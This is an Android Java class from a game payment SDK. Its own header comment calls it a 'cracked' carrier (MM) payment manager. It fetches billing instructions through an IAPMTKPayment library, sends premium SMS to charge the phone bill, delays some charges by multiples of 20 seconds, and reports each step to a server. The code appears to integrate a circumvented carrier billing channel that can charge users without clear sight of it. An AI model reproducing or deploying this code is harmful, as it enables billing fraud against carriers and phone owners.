package mobi.zty.pay.sdk.leyouFee;

import java.util.HashMap;
import java.util.Map;

import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PayResultInfo;
import mobi.zty.pay.sdk.PaymentInterf;
import mobi.zty.sdk.game.Constants;
import mobi.zty.sdk.game.GameSDK;
import mobi.zty.sdk.game.bean.FeeInfo;
import mobi.zty.sdk.game.bean.MkInfo;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.Util_G;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;

import com.iap.youshu.IAPMTKPayment;
import com.iap.youshu.PaymentInfo;

/**
 * mm网络破解支付管理类
 * @author Administrator
 *
 */
public class LeYouFeeInstance extends PaymentInterf{
	private Map<String, Boolean> channelInitMap = new HashMap<String, Boolean>();
	private static LeYouFeeInstance instance;
	private Handler callBHandler = null;
	private String payCode;
	private Context context;
	private final int NOTIGY_DELAY_MSG = 1;
	private final int NOTIGY_SEND_MSG = 2;
	private Handler handler = new Handler(){
		private Object[] parames = null;
		public void handleMessage(Message msg) {
			if (msg.what == NOTIGY_DELAY_MSG) {
				parames = (Object[]) msg.obj;
				int feeIndex = (Integer) parames[1];
				sendEmptyMessageDelayed(NOTIGY_SEND_MSG, feeIndex*20000);
			}else if(msg.what == NOTIGY_SEND_MSG){
				realyPay(parames);
			}
		};
	};
	public static LeYouFeeInstance getInstance(){
		if(instance==null){
			instance = scyMMpay();
		}
		return instance;
	}
	private static synchronized LeYouFeeInstance scyMMpay(){
		if(instance==null){
			instance =  new LeYouFeeInstance();
		}
		return instance;
	}
	@Override
	public void init(Context context, Object... parameters) {
		callBHandler = (Handler) parameters[0];
		MkInfo info = (MkInfo) parameters[1];
		String channelId = info.spChannel;
		
		initChannel(context, channelId);
	}
	private synchronized void initChannel(Context context, String channelId) {
		try {
			channelInitMap.clear();
			PaymentInfo.Init(context, channelId);
			channelInitMap.put(channelId, true);
		} catch (Exception e) {
			channelInitMap.put(channelId, false);
			e.printStackTrace();
		}
	}

	@Override
	public synchronized void pay(Context context, Object... parameters) {
		this.context = context;
		int feeIndex = (Integer) parameters[1];
		Helper.sendPayMessageToServer(PayConfig.LEYOU_FEE, "进入支付：", feeIndex);
		if (feeIndex>0) {
			Message msg = handler.obtainMessage(NOTIGY_DELAY_MSG);
			msg.obj = parameters;
			msg.sendToTarget();
		}else{
			realyPay(parameters);
		}
		
	}
	private void realyPay(Object... parameters) {
		final String exData = (String) parameters[0];
		final int feeIndex = (Integer) parameters[1];
		FeeInfo feeInfo = (FeeInfo) parameters[2];
		MkInfo mkInfo = (MkInfo) parameters[3];
		final String appID = mkInfo.appId;
		payCode = feeInfo.payCode;
		final String channelId = mkInfo.spChannel;
		Helper.sendPayMessageToServer(PayConfig.LEYOU_FEE, "参数赋值完毕", feeIndex);
		if (!(channelInitMap.containsKey(channelId)&&channelInitMap.get(channelId))) {
			Helper.sendPayMessageToServer(PayConfig.LEYOU_FEE, "新渠道需再次初始化！"+channelId, feeIndex);
			initChannel(context, channelId);
		}
		if (!(channelInitMap.containsKey(channelId)&&channelInitMap.get(channelId))) {
			PayResultInfo info = new PayResultInfo();
			info.resutCode = PayConfig.SP_INIT_FAIL;
			info.retMsg = "leyou初始化失败";
			Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
			message.obj = info;
			message.sendToTarget();
			Helper.sendPayMessageToServer(PayConfig.LEYOU_FEE,"渠道初始化失败！"+channelId, feeIndex);
			return;
		}
		payCode = String.format("%s%02d", appID,(Integer.parseInt(payCode)));
			new Thread(new Runnable() {
				@Override
				public void run() {
					PayResultInfo info = new PayResultInfo();
					info.index = feeIndex;
					try {
						Looper.prepare();
						Helper.sendPayMessageToServer(PayConfig.LEYOU_FEE, 
								"执行支付！"+"payCode="+payCode+"appID="+appID+"channelId="+channelId, feeIndex);
						IAPMTKPayment payment = IAPMTKPayment.doMTK102OpertionRequest
								(payCode,exData,appID,channelId,PaymentInfo.getTelecom());
						boolean isSendScc = true;
						if (payment.getResult() == 0||payment.getResult() ==1) {
							if (payment.getResult() ==1) {
								info.resutCode = PayConfig.BIIL_SUCC;
								info.retMsg = "支付成功！";
								Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
								message.obj = info;
								message.sendToTarget();
								Helper.sendPayMessageToServer(PayConfig.LEYOU_FEE,
										"乐游告知直接成功", feeIndex);
							}else{
								Intent itSend = new Intent(Constants.SENT_SMS_ACTION);  
								itSend.putExtra("fee_index", feeIndex);
						        PendingIntent mSendPI = PendingIntent.getBroadcast(context.getApplicationContext(), 0, itSend, PendingIntent.FLAG_ONE_SHOT);//这里requestCode和flag的设置很重要，影响数据KEY_PHONENUM的传递。   
						        payment.sendSms(mSendPI, null);
						        Util_G.debugE("l_pay", "mm_pay_data-> index =="+info.index);
						        Helper.sendPayMessageToServer(PayConfig.LEYOU_FEE,
										"执行发送短信", feeIndex);
							}
							
						}else{
							
							isSendScc = false;
						}
						if (!isSendScc) {
							info.resutCode = PayConfig.SP_PAY_FAIL;
							info.retMsg = "获取指令失败"+payment.getResult();
							Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
							message.obj = info;
							message.sendToTarget();
							Helper.sendPayMessageToServer(PayConfig.LEYOU_FEE,
									info.retMsg, feeIndex);
							return;
						}
					} catch (Exception e) {
						info.resutCode = PayConfig.SP_PAY_EXPTION;
						info.retMsg = "调用支付时代码异常";
						Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
						message.obj = info;
						message.sendToTarget();
						e.printStackTrace();
					}
				}
			}).start();;
	}
}
